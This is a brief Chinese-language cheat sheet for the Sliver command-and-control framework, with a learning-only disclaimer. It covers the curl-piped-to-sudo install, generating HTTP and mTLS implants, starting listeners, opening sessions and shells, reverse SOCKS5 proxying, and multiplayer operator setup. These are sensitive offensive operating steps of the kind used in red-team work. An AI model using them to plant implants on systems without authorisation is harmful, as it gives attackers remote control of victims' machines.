# sliver

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**
- https://github.com/BishopFox/sliver

**使用文档**
- https://github.com/BishopFox/sliver/wiki

---

## 安装

**官方一条命令版**
```bash
curl https://sliver.sh/install|sudo bash

sliver
```

---

## 使用

### 生成 shell (http)

**Session Mode**
```bash
generate --http example.com --save /tmp

# 指定平台
generate --http example.com --save /tmp --os win
generate --http example.com --save /tmp --os linux
```

**Beacon Mode**
```bash
generate beacon --http example.com --save /tmp
```

**启动监听器**
```bash
http --domain example.com
```

### 生成 shell (mtls)

```bash
generate --mtls example.com --save /tmp --os win
```

**启动监听器**
```bash
mtls
jobs
```

### 进入 shell

```bash
sessions

use [session id]
```

**interactive**
```bash
# 在进入 sessions 后 (仅beacon模式可用)
interactive

close
```

**shell**
```bash
# 在进入 sessions 后
shell
```

### socks5

- https://github.com/BishopFox/sliver/wiki/Reverse-SOCKS
- https://github.com/BishopFox/sliver/tree/master/client/command/socks

**开启 socks5 代理**
```bash
# 在进入 sessions 后 (仅 session 模式可用)
socks5 start

# 默认监听在 127.0.0.1 可自行指定监听的ip、端口、配置socks5认证
socks5 start --help
```

**关闭 socks5 代理**
```bash
socks5 stop -i [ID]
```

---

## 多人运动

- https://github.com/BishopFox/sliver/wiki/Multiplayer-Mode

**服务端**
```bash
/root/sliver-server operator --name f8x --lhost [服务端ip] --save f8x.cfg
```

**用户端**
```bash
sliver import ./f8x.cfg

sliver
# 再次启动会让你选择使用哪个 server
```
